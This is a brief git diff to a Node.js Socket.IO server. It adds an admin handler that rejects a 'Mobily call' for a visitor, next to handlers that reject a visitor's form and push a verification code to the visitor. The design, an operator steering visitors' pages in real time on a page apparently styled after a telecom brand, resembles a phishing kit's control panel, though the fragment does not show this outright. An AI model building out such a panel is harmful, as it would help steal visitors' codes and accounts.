@@ -494,6 +494,12 @@ io.on("connection", (socket) => {
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
 
+  // Admin: Reject Mobily call (special handling for Mobily page)
+  socket.on("admin:mobilyReject", (visitorSocketId) => {
+    io.to(visitorSocketId).emit("mobily:rejected");
+    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
+  });
+
   // Admin: Send verification code
   socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
     io.to(visitorSocketId).emit("code", code);
